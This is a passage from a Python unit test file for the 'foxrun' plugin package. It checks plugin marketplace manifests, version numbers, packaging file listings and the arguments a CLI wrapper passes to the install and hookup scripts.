        codex = json.loads((TREE / '.agents/plugins/marketplace.json').read_text())
        self.assertEqual([p['source'] for p in claude['plugins']], ['./plugins/foxrun'])
        self.assertEqual([p['source'] for p in codex['plugins']], [{'source': 'local', 'path': './plugins/foxrun'}])
        version = (TREE / 'VERSION').read_text().strip()
        for name in ('.claude-plugin/plugin.json', '.codex-plugin/plugin.json'):
            manifest = json.loads((self.PLUGIN / name).read_text())
            self.assertEqual((manifest['name'], manifest['version']), ('foxrun', version), name)
        self.assertEqual(json.loads((self.PLUGIN / '.codex-plugin/plugin.json').read_text())['skills'], './skills/')

    def test_packaging_files_ship_in_the_transport_manifest(self):
        with (TREE / 'product-manifest.tsv').open(newline='') as stream:
            listed = {row['path'] for row in csv.DictReader(stream, delimiter='\t')}
        packaging = {name for name in install.BUILD_ONLY
                     if name.startswith(('pyproject', 'packaging/', '.claude-plugin/', '.agents/', 'plugins/'))}
        self.assertEqual(sorted(packaging - listed), [])

    def test_cli_runs_install_with_the_same_arguments(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location('foxrun_cli', str(TREE / 'packaging/foxrun_cli.py'))
        cli = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(cli)
        with mock.patch.object(cli, 'PRODUCT', TREE), mock.patch.object(cli.subprocess, 'run') as run:
            run.return_value.returncode = 0
            self.assertEqual(cli.main(['install', '--home', '/x', '--yes']), 0)
        self.assertEqual(run.call_args[0][0], [sys.executable, '-B', str(TREE / 'install.py'), '--home', '/x', '--yes'])
        with mock.patch.object(cli, 'PRODUCT', TREE), mock.patch.object(cli.subprocess, 'run') as run:
            run.return_value.returncode = 0
            self.assertEqual(cli.main(['hookup', '--runtime', 'both', '--home', '/x']), 0)
        self.assertEqual(run.call_args[0][0], [sys.executable, '-B', str(TREE / 'foxrun.py'), 'hookup',
                                               '--runtime', 'both', '--home', '/x'])
        self.assertEqual(cli.main(['doctor']), 2)


if __name__=='__main__':
    unittest.main()
